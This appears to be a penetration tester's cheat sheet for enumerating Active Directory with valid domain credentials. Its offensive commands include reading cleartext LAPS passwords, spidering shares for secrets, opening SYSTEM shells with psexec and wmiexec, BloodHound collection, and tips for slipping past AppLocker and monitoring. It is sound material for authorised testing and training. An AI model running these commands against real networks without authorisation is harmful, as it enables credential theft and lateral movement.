# Credentialed AD Enumeration 
*(Post-foothold — you have at least one set of valid domain creds, a hash, or SYSTEM on a domain-joined host)*

---

## 1. Enumerate Security Controls First

Know what you're up against before you drop tools on a host — this shapes which tools you can even use.

**Windows Defender status:**
```powershell
Get-MpComputerStatus
```
Check `RealTimeProtectionEnabled` — if `True`, expect AMSI/signature detection on common offensive PowerShell (PowerView, Mimikatz, etc.). Obfuscation/bypass techniques are their own topic — out of scope here.

**AppLocker (application whitelisting) rules:**
```powershell
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections
```
Common gap: orgs block `%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe` but forget `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`. Check both paths before assuming PowerShell is fully blocked.

**PowerShell Language Mode:**
```powershell
$ExecutionContext.SessionState.LanguageMode
```
`ConstrainedLanguage` = COM objects, unapproved .NET types, PS classes, XAML workflows all blocked. Significantly limits what offensive PS tooling will run cleanly.

**LAPS enumeration (who can read local admin passwords):**
```powershell
# LAPSToolkit
Find-LAPSDelegatedGroups        # groups with delegated LAPS-read rights per OU
Find-AdmPwdExtendedRights       # users/groups with "All Extended Rights" — often less protected than delegated groups
Get-LAPSComputers               # pulls cleartext LAPS passwords if your account has read rights
```
Any user who joined a computer to the domain automatically gets All Extended Rights on that computer object — which includes LAPS password read. Worth checking who has this even if not delegated.

---

## 2. Credentialed Enumeration — from Linux

> `crackmapexec` is dead — use **netexec (nxc)**, the actively maintained fork. Same flags, same muscle memory.

**Domain user enumeration (shows `badpwdcount` — useful for safe spray-list building):**
```bash
nxc smb <DC_IP> -u <user> -p '<pass>' --users
```

**Domain group enumeration:**
```bash
nxc smb <DC_IP> -u <user> -p '<pass>' --groups
```

**Logged-on users on a target host (hunt for admins/high-value sessions):**
```bash
nxc smb <target_IP> -u <user> -p '<pass>' --loggedon-users
```
`(Pwn3d!)` next to the result = you're local admin on that box.

**Share enumeration + permissions:**
```bash
nxc smb <DC_IP> -u <user> -p '<pass>' --shares
```

**Spider shares for interesting files (configs, creds, PII):**
```bash
nxc smb <DC_IP> -u <user> -p '<pass>' -M spider_plus --share 'Department Shares'
cat /tmp/cme_spider_plus/<DC_IP>.json
```

**SMBMap — alternative share tool, good for recursive listing / content search:**
```bash
smbmap -u <user> -p '<pass>' -d <domain> -H <DC_IP>
smbmap -u <user> -p '<pass>' -d <domain> -H <DC_IP> -R 'Department Shares' --dir-only
```

**rpcclient — enumerate by RID, dump all users:**
```bash
rpcclient -U "<user>%<pass>" <DC_IP>
rpcclient $> enumdomusers
rpcclient $> queryuser 0x457
```
RID `0x1f4` (500) is always the built-in Administrator — consistent across every domain, useful as a known anchor point.

**Impacket — psexec.py (SYSTEM shell, drops a service binary on ADMIN$):**
```bash
psexec.py <domain>/<user>:'<pass>'@<target_IP>
```
Requires local admin creds on target. Noisier (writes to disk, registers a service) but gives SYSTEM.

**Impacket — wmiexec.py (semi-interactive, no disk artifact, runs as the user not SYSTEM):**
```bash
wmiexec.py <domain>/<user>:'<pass>'@<target_IP>
```
Stealthier than psexec, but each command spawns a fresh `cmd.exe` via WMI — shows up as Event ID 4688 if monitored.

**LDAP enumeration — `windapsearch` is unmaintained, skip it. Use:**
```bash
# ldapdomaindump — generates browsable HTML/JSON/grep-able output of the whole domain
ldapdomaindump -u '<domain>\<user>' -p '<pass>' <DC_IP>

# or straight ldapsearch for targeted queries
ldapsearch -H ldap://<DC_IP> -x -D "<user>@<domain>" -w '<pass>' -b "DC=domain,DC=local" "(&(objectclass=user))"
```

**BloodHound.py (bloodhound-python) — the big one. Maps the whole attack-path graph:**
```bash
bloodhound-python -u '<user>' -p '<pass>' -ns <DC_IP> -d <domain> -c all
```
`-c all` collects everything (users, groups, sessions, ACLs, trusts, GPOs, local admin, etc.). Upload the resulting `.json` files (zip them first: `zip -r out.zip *.json`) into the BloodHound GUI, then run built-in queries like **Find Shortest Paths to Domain Admins**.

---

## 3. Credentialed Enumeration — from Windows

**ActiveDirectory PowerShell module (built-in, low-noise — blends in with legit admin activity):**
```powershell
Import-Module ActiveDirectory
Get-ADDomain                                                          # domain SID, functional level, trusts overview
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName   # Kerberoastable accounts
Get-ADTrust -Filter *                                                 # trust relationships
Get-ADGroup -Filter * | Select name
Get-ADGroupMember -Identity "Backup Operators"
```

**PowerView** — the original is part of deprecated PowerSploit; **use the BC-Security fork** (actively maintained as part of their Empire 4 project), not the original repo:
```powershell
Import-Module .\PowerView.ps1
Get-DomainUser -Identity <user> -Domain <domain> | Select name,memberof,pwdlastset,useraccountcontrol
Get-DomainGroupMember -Identity "Domain Admins" -Recurse     # resolves nested group membership
Get-DomainTrustMapping
Test-AdminAccess -ComputerName <target>
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName   # Kerberoasting targets
```

**SharpView** — .NET port of PowerView, useful specifically when PowerShell itself is restricted/monitored (AppLocker, Constrained Language Mode, AMSI pressure):
```powershell
.\SharpView.exe Get-DomainUser -Identity <user>
```

**Snaffler** — automated share/credential hunting across the whole domain (must run from a domain-joined context):
```powershell
Snaffler.exe -s -d <domain> -o snaffler.log -v data
```
Color-coded output — Red/Black flags on file extensions commonly tied to secrets (`.key`, `.kdb`, `.psafe3`, `.sqldump`, config files, etc.). Raw output is also useful to hand to the client as supplemental evidence.

**SharpHound (BloodHound Windows collector):**
```powershell
.\SharpHound.exe -c All --zipfilename <output_name>
```
Upload the resulting zip into BloodHound GUI same as the Python ingestor. Prefer `--stealth` flag when OPSEC matters — it restricts collection to DCOnly-safe methods where possible.

---

## 4. Priorities Once You Have Credentialed Access

1. Run BloodHound collection (Linux or Windows ingestor) early — it's the fastest way to see the actual attack-path shape of the domain.
2. Pull `--users`/`--groups`/`--shares` via nxc for quick situational awareness while BloodHound data is still being analyzed.
3. Check logged-on users on file servers / jump hosts — high-value sessions (domain admins, service accounts) are often sitting there.
4. Spider accessible shares for creds/configs before doing anything noisier.
5. Note every SPN-set account — feeds directly into Kerberoasting (separate attack, not covered here).
6. Note LAPS delegation gaps and AppLocker/Defender posture for the report, even if they don't become your attack path.

---

## What changed vs. the old-school (HTB Academy module) version
- `crackmapexec` → `netexec` (CME unmaintained; nxc is the active fork, same syntax)
- `windapsearch` → dropped; use `ldapdomaindump` or `ldapsearch` / `bloodhound-python` for LDAP-based enumeration — all more reliable and still maintained
- Original PowerSploit `PowerView` → explicitly use the **BC-Security fork** (Empire 4 project) — the original repo is dead, and the fork gets regular updates/new functions
- Kept `rpcclient`, `SMBMap`, `Impacket` (psexec/wmiexec), `Snaffler`, `SharpHound`/`BloodHound.py` as-is — all still current and still the best tools for their specific jobs, no modern replacement needed
